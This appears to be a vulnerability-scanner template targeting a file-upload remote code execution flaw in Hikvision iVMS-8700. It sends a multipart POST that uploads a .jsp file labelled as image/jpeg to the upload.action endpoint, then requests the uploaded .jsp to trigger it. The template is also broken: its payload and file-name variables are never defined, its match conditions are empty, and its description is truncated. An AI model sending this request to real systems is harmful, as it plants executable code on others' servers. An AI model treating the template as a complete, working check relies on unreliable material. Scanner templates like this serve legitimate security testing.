id: hikvision-ivms-file-upload-rce
brief:
    title: Hikvision iVMS-8700 - File Upload Remote Code Execution
    by: brucelsone
    level: critical
    about: Arbitrary file upload vulnerability in HIKVISION iVMS-8700 Integrated Security Management Platform Software allows attackers to upload and execute malicious files, leading to potential unauthorized...
    label:
        - hikvision
        - ivms
        - fileupload
        - rce
        - intrusive
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/eps/resourceOperations/upload.action'
      head:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
        User-Agent: MicroMessenger
      body: |-
        ------WebKitFormBoundaryTJyhtTNqdMNLZLhj
        Content-Disposition: form-data; name="fileUploader";filename="{{str1}}.jsp"
        Content-Type: image/jpeg

        {{str3}}
        ------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/eps/upload/{{res_id}}.jsp'
      signs: []
